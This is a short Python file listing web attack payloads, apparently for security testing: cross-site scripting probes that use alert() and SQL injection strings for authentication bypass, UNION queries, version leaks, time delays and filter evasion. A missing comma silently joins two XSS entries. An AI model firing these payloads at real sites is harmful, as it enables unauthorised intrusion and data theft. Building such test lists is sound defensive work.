XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    '<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    "<audio src/onerror=alert(1)>",
    "<a id=x tabindex=1 onfocus=alert(1)></a>"
    "<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
    '<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
    'test+(<script>alert(0)</script>)@example[.]com',
    'test@example(<script>alert(0)</script>).com',
    '"<script>alert(0)</script>"@example[.]com'
]

SQLI_PAYLOADS = [

    "' OR 1=1 -- ",
    '" OR "a"="a',
    "1 OR 1=1",  


    "' UNION SELECT 1,2,3-- ",
    "' AND 1=CONVERT(int, (SELECT @@version))-- ",


    "' OR 1234=SLEEP(5) -- ",


    "'%0AOR%0A1=1 -- ",
    "'/**/OR/**/1=1 -- ",
    "1'||(SELECT 1 FROM users WHERE 1=1)||'",


    "' UNION SELECT 'a',sqlite_version(),3 -- ",
    "admin'-- "
]
